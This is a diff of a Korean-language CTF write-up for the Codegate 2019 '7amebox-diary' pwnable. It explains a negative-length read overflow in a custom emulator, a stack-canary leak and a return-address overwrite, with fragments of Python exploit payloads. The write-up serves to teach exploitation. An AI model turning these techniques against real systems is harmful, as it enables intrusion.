@@ -4,11 +4,12 @@ date = "2024-07-30"
 description = "Codegate CTF 2019 pwnable challenge"
 
 [taxonomies]
-tags = ["ctf", "pwnable", "vm", "bof", "rop"]
+tags = ["ctf", "pwnable", "vm", "improper check", "bof", "rop"]
 +++
 
 ## 0x00. Introduction
 역시 기본적인 구조는 [7amebox-name](../Codegate-CTF-2019-Quals-7amebox-name/)과 동일하다.
+
 ``` bash
 ➜  ls -al
 total 64
@@ -56,12 +57,14 @@ void main() {
     }
 }
 ```
+
 `diary` 구조체를 `write`를 이용해서 생성하고 `list` 및 `show`로 출력, `edit`으로 수정할 수 있는 firmware이다.
+
 
 ## 0x01. Vulnerability
 `7amebox-name`보다 firmware 사이즈가 많이 커져서 일단 C로 포팅을 했는데 아무리 봐도 취약점이 없었다.
-
 그래서 emulator쪽 코드를 다시 보다보니 이런 코드가 있었다.
+
 ``` python
 class Stdin:
     def read(self, size):
@@ -79,9 +82,10 @@ class Stdin:
     def write(self, data):
         return None
 ```
-1byte가 7bit인 환경이기 때문에 0x80보다 큰 값을 입력받으면 입력이 끊기고 return한다.
 
+1byte가 7bit인 환경이기 때문에 0x80보다 큰 값을 입력받으면 입력이 끊기고 return한다.
 별거 아닌 것 같지만 이러면 `write`를 할 때 큰 취약점이 발생한다.
+
 ```
    0x286:  10 5b           mov r5, bp     
    0x288:  2e 50 06 00 00  sub r5, 0x6    
@@ -105,11 +109,13 @@ class Stdin:
    0x2c4:  10 06           mov r0, r6     
    0x2c6:  7b 50 44 00 06  call read_0x60f ; read(memory + 1260, r0)
 ```
+
 `write`는 `title` -> `contents` -> `key` 순서로 입력을 받는데 `contents`와 `key`를 xor해서 저장하기 때문에 `contents`와 `key`를 같은 길이로 입력해야한다.
 
-assembly에서 보면 `contents`를 입력받는 `0x29b`에서 결과값인 `r0`의 값을 가지고 바로 `key`를 입력받을 길이를 결정하게 된다.
+Assembly에서 보면 `contents`를 입력받는 `0x29b`에서 결과값인 `r0`의 값을 가지고 바로 `key`를 입력받을 길이를 결정하게 된다.
 
 이 과정에서 마지막 `\n`을 없애주기 위해 `0x2a0`에서 `dec r0`를 수행하는데, `Stdin`에 0x80보다 큰 값을 줘서 `r0`를 0으로 만들면 `key`를 입력받을 길이가 -1이 되어버린다.
+
 ``` bash
 r0 : 0x3
 r1 : 0x0
@@ -129,7 +135,9 @@ eflags : 0x1
 zero : 0x0
 PC : 20 00           syscall
 ```
+
 그러면 이 syscall이 어떻게 처리되는지 확인해야하는데,
+
 ``` python
     def sys_s3(self):   # read
         fd = self.register.get_register('r1')
@@ -144,7 +152,9 @@ PC : 20 00           syscall
         else:
             self.register.set_register('r0', 0)
 ```
+
 다행히 size가 0보다 작은 경우를 처리하지 않기 때문에 `0b111111111111111111111`만큼 입력을 받는 엄청난 overflow가 발생하게 된다.
+
 ``` python
     def write_memory(self, addr, data, length):
         if not length:
@@ -156,10 +166,12 @@ PC : 20 00           syscall
         else:
             self.terminate("[VM] Can't write memory")
 ```
+
 또한 `write_memory`에서 메모리를 쓰기 시작하는 page와 끝나는 page의 권한만 확인하기 때문에 중간 page들에 권한이 없더라도 쓰기가 가능하다.
 
+
 ## 0x02. Exploit
-### Canary leak
+### Canary Leak
 ```
    0x587:  10 5b           mov r5, bp     
    0x589:  2e 50 03 00 00  sub r5, 0x3    
@@ -176,9 +188,11 @@ stack_chk_fail_0x59d:
    0x5a7:  54 00           xor r0, r0     
    0x5a9:  20 00           syscall        
 ```
+
 모든 함수의 끝에서 `r9`에 저장해놓은 값과 `[bp-0x3]`에 저장된 값을 비교하는 stack 보호 기법이 있다.
 
 따라서 이 값을 leak해야하는데, 0x59003에 `canary`가 저장된 주소를 쓸 수 있다면 `list`에서 leak이 가능할 것 같았다.
+
 ``` c
 char *load_diary(int i) {
     int *r10 = 0x59000;
@@ -195,7 +209,9 @@ void list_0x12e() {
     ...
 }         
 ```
+
 문제는 말하자면 전역변수 공간인 `0x59000`보다 앞에 있는 주소에 `diary`를 할당받아야 overwrite가 가능한데, 새로운 메모리를 할당해주는 로직은 다음과 같다.
+
 ``` python
     def allocate(self, new_perm, addr=None):
         if addr:
@@ -211,18 +227,21 @@ void list_0x12e() {
                 return page
         return -1
 ```
-할당받을 주소를 전달하지 않으면 `for page, perm in self.pages.items()`를 통해서 `pages`를 순회하며 mapping이 되지 않은 공간을 return해준다.
 
+할당받을 주소를 전달하지 않으면 `for page, perm in self.pages.items()`를 통해서 `pages`를 순회하며 mapping이 되지 않은 공간을 return해준다.
 이 때 python 2.7 버전에서는 dictionary를 랜덤한 순서로 순회하므로 `0x59000`보다 낮은 공간이 할당될 때까지 `write`를 하면 된다.
 
 `allocate`에 후킹을 걸어서 할당된 메모리를 출력해본 결과 다행히 두번째만에 `0x59000`보다 낮은 공간이 할당되었다.
+
 ``` bash
 addr : 0xc4000
 new perm : 0b1110
 addr : 0x1c000
 new perm : 0b1110
 ```
+
 따라서 할당받은 `0x1c000`의 `key` 주소로부터 `diary_ptr`이 저장되는 `0x59003`까지의 offset을 계산해서 다음과 같이 payload를 작성하면 leak이 가능하다.
+
 ``` python
     write(s, b"AAAA", b"aaaa", b"1111")     # 0xc4000
     payload = b"b" * (data_addr - (0x1c000 + 0x4ec))
@@ -239,12 +258,14 @@ new perm : 0b1110
 이제 `canary`를 포함해서 stack의 return address를 덮으면 `pc` 컨트롤이 가능하다.
 
 다만 `read_0x60f`를 호출해서 입력을 받는데 이 함수에도 `canary`가 있으므로 이를 유의해서 payload를 작성해야 한다.
+
 ``` python
     payload = b"c" * (read_canary_addr - (0x3a000 + 0x4ec))
     payload += p21(canary)                  # canary of read_0x60f
     payload += b"flag\x00\x00"
     payload += p21(canary)                  # canary of write_0x1f0
 ```
+
 
 ## 0x03. Payload
 ``` python
@@ -336,6 +357,7 @@ def main():
 if __name__=='__main__':
     main()
 ```
+
 
 ## 0x04. Decompile
 ``` c
